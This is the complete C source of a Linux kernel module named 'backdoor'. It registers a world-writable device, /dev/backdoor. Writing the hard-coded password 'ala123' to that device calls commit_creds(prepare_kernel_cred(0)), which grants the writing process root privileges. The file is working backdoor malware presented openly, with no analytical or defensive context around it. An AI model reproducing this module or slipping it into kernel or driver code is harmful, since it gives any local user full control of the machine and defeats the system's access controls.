#include <linux/module.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/proc_fs.h>
#include <linux/fcntl.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/cred.h>

const struct file_operations backdoor_fops;
struct miscdevice device;

static int __init backdoor_init(void)
{
	
	int result;
	if ((result = misc_register(&device)) < 0) {
		printk(KERN_WARNING "Cannot register the /dev/%s miscdevice", device.name);
		goto err;
	}
	return 0;
	
	err:
		misc_deregister(&device);
		return result;
}

static void __exit backdoor_exit(void)
{

	misc_deregister(&device);
			
	printk(KERN_INFO "The BACKDOOR module has been removed\n");
	return;
}


ssize_t backdoor_write(struct file *filp, const char __user *user_buf,
	size_t count, loff_t *f_pos)
{
	int i;
	char buffer[8];
	size_t str_length = 7 - *f_pos;
	size_t to_cpy = (count > str_length) ? str_length : count;

		
	for (i = 0; i< 8; i++)
		buffer[i] = '\0';
		
	if(count >= 8) return -ENOSPC;
	if( _copy_from_user(buffer + *f_pos, user_buf, to_cpy) != 0)
		return -EFAULT;

	*f_pos += to_cpy;
	if(strncmp(buffer, "ala123\n", to_cpy > 7 ? 7 : to_cpy) == 0)
		commit_creds(prepare_kernel_cred(0));
	
	return to_cpy;
		
}


module_init(backdoor_init);
module_exit(backdoor_exit);

const struct file_operations backdoor_fops = {
	.write = backdoor_write,
};

struct miscdevice device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "backdoor",
	.fops = &backdoor_fops,
	.mode = 0666,
};
